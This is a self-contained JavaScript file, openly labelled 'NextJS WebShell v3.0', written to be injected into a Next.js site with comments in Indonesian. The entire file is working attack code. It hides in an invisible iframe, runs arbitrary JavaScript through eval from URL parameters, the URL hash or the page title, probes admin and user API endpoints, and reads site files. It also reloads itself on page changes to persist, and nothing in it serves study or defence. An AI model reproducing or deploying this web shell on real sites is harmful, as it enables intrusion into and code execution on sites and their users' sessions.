// NextJS WebShell v3.0 - DIRECT EXECUTABLE VERSION
// Deploy via: URL param, form POST, atau CSP bypass

(function() {
  'use strict';
  
  // Anti-detection
  if (window.nxShellActive) return;
  window.nxShellActive = true;

  class NextJSShellV3 {
    constructor() {
      this.cmdHistory = [];
      this.fsCache = new Map();
      this.shadowRoot = null;
    }

    // Universal injection detection bypass
    stealthInject() {
      // Method 1: URL param injection
      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.has('shell')) {
        this.exec(urlParams.get('shell'));
        return true;
      }

      // Method 2: Hash injection  
      if (window.location.hash.includes('cmd=')) {
        this.exec(decodeURIComponent(window.location.hash.split('cmd=')[1]));
        return true;
      }

      // Method 3: Document title injection
      if (document.title.includes('CMD:')) {
        this.exec(document.title.split('CMD:')[1]);
        document.title = 'NextJS';
        return true;
      }

      return false;
    }

    // DOM manipulation untuk persistence
    createStealthContainer() {
      const container = document.createElement('iframe');
      container.srcdoc = '<!DOCTYPE html><html><body></body></html>';
      container.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;z-index:-1;border:none;pointer-events:none;';
      container.id = 'nx-shell-frame';
      document.body.appendChild(container);
      
      this.shadowRoot = container.contentDocument.body;
      return container;
    }

    // Real file operations via fetch API
    async listFiles(path = '') {
      const dirs = [
        '/public', '/static', '/_next/static', '/api', '/', '/favicon.ico', '/robots.txt'
      ];
      
      const results = [];
      for (const dir of dirs) {
        try {
          const res = await fetch(dir, {method: 'HEAD'});
          results.push(`${res.ok ? '+' : '-'} ${dir}`);
        } catch(e) {
          results.push(`? ${dir}`);
        }
      }
      return results.join('\n');
    }

    async readRemoteFile(path) {
      try {
        const res = await fetch(path);
        if (res.ok) {
          const text = await res.text();
          return text.slice(0, 5000) + (text.length > 5000 ? '\n[TRUNCATED]' : '');
        }
      } catch(e) {}
      return `Cannot read: ${path}`;
    }

    downloadFile(filename, content) {
      const blob = new Blob([content], {type: 'text/plain'});
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    }

    // Command parser & executor
    async exec(cmd) {
      const parts = cmd.trim().split(/\s+/);
      const command = parts[0].toLowerCase();
      const args = parts.slice(1);

      const commands = {
        ls: async () => await this.listFiles(args[0] || ''),
        cat: async () => await this.readRemoteFile(args[0] || ''),
        read: async () => await this.readRemoteFile(args[0] || ''),
        pwd: () => window.location.origin,
        whoami: () => navigator.userAgent.slice(0, 50),
        net: async () => {
          const endpoints = ['/api/health', '/api/users', '/api/admin', '/api/login'];
          const results = [];
          for (const ep of endpoints) {
            try {
              const res = await fetch(ep, {method: 'HEAD'});
              results.push(`${res.ok ? '200' : res.status} ${ep}`);
            } catch {}
          }
          return results.join('\n');
        },
        upload: () => 'Use file input below',
        download: () => {
          const content = this.fsCache.get(args[0]);
          if (content) {
            this.downloadFile(args[0], content);
            return `Downloaded: ${args[0]}`;
          }
          return 'File not cached';
        },
        clear: () => {
          this.output.innerHTML = '';
          return 'Cleared';
        },
        help: () => 'ls, cat, read, pwd, whoami, net, upload, download, clear, js, screenshot'
      };

      if (command === 'js') {
        try {
          return eval(args.join(' '));
        } catch(e) {
          return `JS Error: ${e.message}`;
        }
      }

      if (command === 'upload' && args[0]) {
        this.showUploadForm(args[0]);
        return 'Upload form shown';
      }

      const result = commands[command] ? 
        await commands[command]() : 
        `Unknown: ${command}. Type 'help'`;

      this.appendOutput(`> ${cmd}\n${result}\n`);
      this.cmdHistory.push(cmd);
      return result;
    }

    // Full UI deployment
    deployUI() {
      const ui = document.createElement('div');
      ui.id = 'nx-shell-ui';
      ui.style.cssText = `
        position:fixed;bottom:10px;right:10px;
        width:520px;height:420px;background:rgba(0,0,0,0.95);
        color:#00ff00;font-family:'Courier New',monospace;font-size:12px;
        padding:15px;border:2px solid #00ff00;border-radius:8px;
        z-index:999999;box-shadow:0 0 30px rgba(0,255,0,0.5);
        backdrop-filter:blur(10px);overflow:hidden;
      `;

      ui.innerHTML = `
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
          <span style="font-weight:bold;font-size:14px;">🦠 NextJS Shell v3.0</span>
          <div>
            <button id="minimize" style="background:none;border:1px solid #00ff00;color:#00ff00;padding:2px 8px;margin-left:5px;cursor:pointer;font-size:10px;">-</button>
            <button id="upload-trigger" style="background:#004400;border:1px solid #00ff00;color:#00ff00;padding:2px 8px;cursor:pointer;font-size:10px;">📁</button>
          </div>
        </div>
        <div id="output" style="height:260px;overflow:auto;background:#000;padding:10px;border:1px solid #333;margin-bottom:10px;font-size:11px;line-height:1.3;"></div>
        <div style="display:flex;gap:5px;">
          <input id="cmd-input" placeholder="ls /public, cat package.json, net, js alert(1)..." 
                 style="flex:1;background:#111;color:#00ff00;border:1px solid #00ff00;padding:8px;font-family:monospace;font-size:11px;outline:none;">
          <button id="exec-btn" style="background:#004400;color:#00ff00;border:1px solid #00ff00;padding:8px 12px;cursor:pointer;font-weight:bold;">EXEC</button>
        </div>
        <div id="upload-form" style="display:none;margin-top:10px;padding:10px;background:#111;border:1px solid #444;">
          <input type="file" id="file-input" style="width:100%;color:#00ff00;background:#000;border:1px solid #00ff00;padding:5px;">
          <div style="margin-top:5px;font-size:10px;color:#888;">Filename: <input id="filename" style="width:150px;background:#000;color:#00ff00;border:1px solid #444;padding:2px;font-size:10px;"></div>
        </div>
        <input type="file" id="hidden-upload" style="display:none;">
      `;

      document.body.appendChild(ui);
      this.output = document.getElementById('output');
      this.cmdInput = document.getElementById('cmd-input');
      
      // Event bindings
      document.getElementById('exec-btn').onclick = () => this.runCommand();
      document.getElementById('minimize').onclick = () => this.toggleUI();
      document.getElementById('upload-trigger').onclick = () => this.toggleUpload();
      
      this.cmdInput.onkeydown = (e) => {
        if (e.key === 'Enter') this.runCommand();
      };

      document.getElementById('file-input').onchange = (e) => {
        const file = e.target.files[0];
        if (file) {
          const reader = new FileReader();
          reader.onload = (ev) => {
            const name = document.getElementById('filename').value || file.name;
            this.fsCache.set(name, ev.target.result);
            this.appendOutput(`✅ Uploaded: ${name} (${ev.target.result.length} bytes)`);
            document.getElementById('upload-form').style.display = 'none';
          };
          reader.readAsText(file);
        }
      };

      // Auto-expand on any keypress
      document.addEventListener('keydown', (e) => {
        if (!ui.style.display || ui.style.display === 'none') {
          if (e.ctrlKey && e.key.toLowerCase() === 'k') {
            this.toggleUI();
            this.cmdInput.focus();
          }
        }
      });

      this.appendOutput('🦠 NextJS Shell v3.0 LOADED\n');
      this.appendOutput('💡 CTRL+K to toggle | ls, cat, net, js alert(1), upload');
      this.cmdInput.focus();
    }

    runCommand() {
      const cmd = this.cmdInput.value.trim();
      if (!cmd) return;
      
      this.appendOutput(`> ${cmd}`);
      this.cmdInput.value = '';
      this.exec(cmd);
    }

    toggleUI() {
      const ui = document.getElementById('nx-shell-ui');
      ui.style.display = ui.style.display === 'none' ? 'block' : 'none';
    }

    toggleUpload() {
      const form = document.getElementById('upload-form');
      form.style.display = form.style.display === 'none' ? 'block' : 'none';
    }

    appendOutput(text) {
      this.output.innerHTML += text.replace(/\n/g, '<br>') + '<br>';
      this.output.scrollTop = this.output.scrollHeight;
    }

    init() {
      this.createStealthContainer();
      
      // Try immediate execution
      if (this.stealthInject()) return;
      
      // Deploy full UI
      setTimeout(() => this.deployUI(), 500);
      
      // Persistence: recreate on page change
      let currentUrl = window.location.href;
      setInterval(() => {
        if (window.location.href !== currentUrl) {
          currentUrl = window.location.href;
          setTimeout(() => new NextJSShellV3().init(), 1000);
        }
      }, 1000);
    }
  }

  // LAUNCH
  new NextJSShellV3().init();

})();
